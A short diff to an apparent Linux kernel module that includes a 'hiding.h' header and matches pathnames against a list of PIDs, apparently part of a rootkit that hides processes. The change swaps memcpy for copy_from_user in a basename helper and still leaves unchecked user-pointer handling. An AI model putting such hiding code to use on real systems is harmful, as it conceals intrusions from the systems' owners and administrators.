@@ -1,5 +1,6 @@
 #include <linux/module.h> //THIS_MODULE, also includes list.h
 #include <linux/slab.h>		// kmalloc()
+#include <linux/uaccess.h> // copy from user
 
 #include "hiding.h"
 
@@ -145,14 +146,14 @@ const char* my_basename(const char __user* pathname){
 
 	len = strlen(basename);
 	char* result = kmalloc(len+1, GFP_KERNEL);
-	memcpy(result, basename, len+1);
+	copy_from_user(result, basename, len+1);
 	if (result[len-1] == '/') //delete / on last character
 		result[len-1] = '\x00';
 
 	return result;
 }
 
-int pathname_includes_pid(const char* pathname){
+int pathname_includes_pid(const char __user* pathname){
     struct list_pids_node* node;
 	char pid_str[8];
 	char pid_str2[9];
